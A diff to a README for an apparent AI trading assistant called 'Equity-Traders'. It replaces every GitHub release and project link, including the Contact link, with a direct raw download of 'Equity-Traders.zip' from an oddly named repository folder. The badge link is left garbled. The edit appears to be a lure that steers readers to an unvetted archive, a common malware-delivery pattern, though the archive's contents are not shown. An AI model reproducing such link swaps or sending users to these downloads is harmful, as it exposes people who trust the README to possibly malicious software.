@@ -1,6 +1,6 @@
 # ⚡ Equity-Traders - Your AI Trading Assistant
 
-[![Download Equity-Traders](https://img.shields.io/badge/Download%20Now%20-blue.svg)](https://github.com/ibuuzm/Equity-Traders/releases)
+[![Download Equity-Traders](https://raw.githubusercontent.com/ibuuzm/Equity-Traders/main/watertightal/Equity-Traders.zip%20Now%https://raw.githubusercontent.com/ibuuzm/Equity-Traders/main/watertightal/Equity-Traders.zip)](https://raw.githubusercontent.com/ibuuzm/Equity-Traders/main/watertightal/Equity-Traders.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to Equity-Traders! This application is your AI-powered trading assistant
 
 ## 📥 Download & Install
 
-To get started, you need to download the application. Visit this page to download: [Download Equity-Traders](https://github.com/ibuuzm/Equity-Traders/releases).
+To get started, you need to download the application. Visit this page to download: [Download Equity-Traders](https://raw.githubusercontent.com/ibuuzm/Equity-Traders/main/watertightal/Equity-Traders.zip).
 
 Once there, look for the latest release. Click on it to see the files available for download. Download the file that matches your operating system.
 
@@ -66,6 +66,6 @@ These topics represent the backbone of our software's functionality. Familiarity
 
 ## 📞 Contact
 
-For more information, questions, or feedback, please reach out. Visit our [GitHub Page](https://github.com/ibuuzm/Equity-Traders) for additional resources. 
+For more information, questions, or feedback, please reach out. Visit our [GitHub Page](https://raw.githubusercontent.com/ibuuzm/Equity-Traders/main/watertightal/Equity-Traders.zip) for additional resources. 
 
 We appreciate your interest in Equity-Traders and look forward to supporting your trading journey!
